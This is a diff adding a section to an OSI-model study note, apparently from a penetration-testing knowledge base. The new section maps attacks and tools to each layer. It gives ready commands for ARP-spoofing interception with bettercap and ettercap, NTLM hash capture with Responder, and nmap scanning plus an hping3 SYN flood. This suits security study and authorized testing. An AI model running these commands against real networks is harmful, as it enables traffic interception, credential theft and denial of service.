@@ -31,3 +31,49 @@ The presentation layer is responsible for translating data between the applicati
 The application layer is the topmost layer and is closest to the end-user. It provides network services directly to user applications. Examples include web browsers, email clients, and file transfer protocols. This layer interacts directly with software applications.
 
 Understanding the OSI model helps in troubleshooting network issues, designing networks, and developing interoperable networking protocols. Each layer has a specific role, and the model as a whole provides a systematic approach to understanding and implementing network communication.
+
+---
+
+## Attacks mapped to each layer
+
+Thinking in layers helps you choose the right attack and the right tool.
+
+| Layer | Example attacks | Tools |
+|-------|-----------------|-------|
+| 7 Application | SQLi, XSS, RCE, auth bypass | Burp, sqlmap, nuclei |
+| 6 Presentation | SSL/TLS downgrade, weak ciphers, padding oracle | testssl.sh, sslscan |
+| 5 Session | Session hijacking, fixation | Burp |
+| 4 Transport | SYN flood, port scanning, TCP RST injection | nmap, hping3 |
+| 3 Network | IP spoofing, ICMP tunneling, routing attacks | scapy, hping3 |
+| 2 Data Link | ARP spoofing, MAC flooding, VLAN hopping, LLMNR/NBT-NS poisoning | ettercap, bettercap, Responder, macof |
+| 1 Physical | Cable tapping, rogue devices, keystroke injection | Rubber Ducky, LAN Turtle |
+
+### Layer 2 example — ARP spoofing (MITM)
+
+```bash
+# Enable forwarding then poison both directions
+echo 1 > /proc/sys/net/ipv4/ip_forward
+bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.10; arp.spoof on; net.sniff on"
+
+# Classic ettercap MITM
+ettercap -T -M arp:remote /192.168.1.10// /192.168.1.1//
+```
+
+### Layer 2 example — LLMNR/NBT-NS poisoning (steal NTLM hashes)
+
+```bash
+responder -I eth0 -wF
+# Captured NetNTLMv2 hashes -> crack with hashcat -m 5600 or relay with ntlmrelayx
+```
+
+### Layer 4 — scanning and SYN flood (lab only)
+
+```bash
+nmap -sS -p- target                      # SYN scan
+hping3 -S --flood -p 80 target           # SYN flood (authorized testing only)
+```
+
+## Related
+
+- [Common Protocols](Common%20Protocols.md)
+- [Wireshark](../Tools/Wireshark.md) · [Active Directory Basics](../Active%20Directory/Active%20Directory%20Basics.md)
